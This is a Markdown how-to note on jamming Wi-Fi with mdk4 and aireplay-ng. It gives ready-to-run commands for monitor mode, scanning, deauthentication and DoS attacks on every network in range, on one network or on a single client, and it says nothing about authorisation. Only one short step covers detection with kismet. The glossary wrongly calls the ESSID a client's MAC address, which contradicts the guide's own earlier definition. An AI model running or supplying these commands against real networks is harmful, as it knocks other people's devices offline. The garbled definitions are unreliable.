---
tags:
  - "#networking"
  - "#security"
  - "#security-testing"
  - "#wifi-jamming"
  - "#mdk4"
  - "#wireless-attacks"
  - "#dos-attack"
  - "#wireless-security"
  - "#packet-capture"
---
# Jamming Wi-Fi with `mdk4`

With the `mdk4` tool, you can jam Wi-Fi networks in various ways. This guide will walk you through the installation, setup, and usage of `mdk4`, including examples for different attacks.

## 1. Installation

If `mdk4` is not installed on your system, install it using the following command:

```bash
sudo apt-get install mdk4 -y
```

### Switching to Root User

If you are not the root user, switch to root:

```bash
sudo su
```

Example:
```bash
kali@gajendra:~$ sudo su
```

## 2. Checking Network Interface Status

Check your network interface status to see if it's in monitor mode:

```bash
iwconfig
```

Example:
```bash
kali@gajendra:~# iwconfig
```

## 3. Enabling Monitor Mode

Monitor mode allows your network card to capture all traffic on a wireless channel. Enable it using one of the following methods:

### 3.1. By Changing the Interface Mode

Use `airmon-ng` to start monitor mode:

```bash
airmon-ng start {interface}
```

Example:
```bash
kali@gajendra:~# airmon-ng start wlan0
```

### 3.2. By Adding a Monitor Interface

Add a new interface with monitor mode:

```bash
iw {interface} interface add {new_interface} type monitor
```

Example:
```bash
kali@gajendra:~# iw wlan0 interface add mon0 type monitor
```

## 4. Scanning Wi-Fi Networks in Monitor Mode

After enabling monitor mode, scan for Wi-Fi networks:

```bash
airodump-ng {monitor_interface}
```

Example:
```bash
kali@gajendra:~# airodump-ng mon0
```

This will display all Wi-Fi networks in range, showing their **BSSID** (MAC address) and **ESSID** (network name).

## 5. Attacking Wi-Fi Networks with `mdk4`

### 5.1. Full Help Command

View all available options in `mdk4`:

```bash
mdk4 --fullhelp
```

Example:
```bash
kali@gajendra:~# mdk4 --fullhelp
```

### 5.2. Jamming All Detected Networks

To jam all Wi-Fi networks detected by your system:

```bash
mdk4 {monitor_interface} d
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d
```

To jam only one specific network, provide the **BSSID** (MAC address):

```bash
mdk4 {monitor_interface} d {BSSID}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d 00:11:22:33:44:55
```

### 5.3. Jamming Networks in Whitelist Mode

Whitelist mode jams all networks except those in your whitelist:

```bash
mdk4 {monitor_interface} d -w {whitelist_file}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d -w /root/whitelist.txt
```

To jam only one network in whitelist mode, provide the **BSSID**:

```bash
mdk4 {monitor_interface} d -w {BSSID}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d -w 00:11:22:33:44:55
```

### 5.4. Jamming Networks in Blacklist Mode

Blacklist mode jams only the networks listed in your blacklist:

```bash
mdk4 {monitor_interface} d -b {blacklist_file}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d -b /root/blacklist.txt
```

To jam only one network in blacklist mode, provide the **BSSID**:

```bash
mdk4 {monitor_interface} d -b {BSSID}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 d -b 00:11:22:33:44:55
```

### 5.5. Jamming Networks by Channel

To jam all networks on a specific channel:

```bash
mdk4 {monitor_interface} c{channel_number}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 c6
```

## 6. Performing a DoS Attack on Wi-Fi Networks

### 6.1. DoS Attack on All Networks

Perform a DoS attack on all detected networks:

```bash
mdk4 {monitor_interface} a
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 a
```

### 6.2. DoS Attack on a Specific Network

Target only one network for a DoS attack by providing the **BSSID**:

```bash
mdk4 {monitor_interface} a -a {BSSID}
```

Example:
```bash
kali@gajendra:~# mdk4 mon0 a -a 00:11:22:33:44:55
```

## 7. Jamming Wi-Fi Networks with `aireplay-ng`

You can also use `aireplay-ng` for jamming. Follow these steps:

### 7.1. Setting Wi-Fi Adapter to a Fixed Channel

Set your Wi-Fi adapter to a fixed channel using `airodump-ng`:

```bash
airodump-ng -c {channel_number} {monitor_interface}
```

Example:
```bash
kali@gajendra:~# airodump-ng -c 6 mon0
```

### 7.2. Jamming All Clients on a Network

Jam all clients on a network by specifying the **BSSID** (network MAC address):

```bash
aireplay-ng -0 0 -a {BSSID} {monitor_interface}
```

Example:
```bash
kali@gajendra:~# aireplay-ng -0 0 -a 00:11:22:33:44:55 mon0
```

### 7.3. Jamming a Specific Client

Jam a specific client on a network by providing both the **BSSID** (network MAC address) and **ESSID** (client's MAC address):

```bash
aireplay-ng -0 0 -a {BSSID} -c {ESSID} {monitor_interface}
```

Example:
```bash
kali@gajendra:~# aireplay-ng -0 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0
```

## 8. Detecting Wi-Fi Jamming Attacks

To detect ongoing Wi-Fi jamming attacks, use the `kismet` tool:

```bash
kismet -c {monitor_interface}
```

Example:
```bash
kali@gajendra:~# kismet -c mon0
```

`kismet` will scan for any active jamming or deauthentication attacks in your vicinity.



### Breakdown of Key Terms:
- **BSSID (Basic Service Set Identifier)**: This is the MAC address of the Wi-Fi network you want to target.
- **ESSID (Extended Service Set Identifier)**: This is the MAC address of a specific client (device) connected to a Wi-Fi network.

In the raw syntax, the placeholders `{BSSID}` and `{ESSID}` show where to input these values when targeting specific networks or clients.
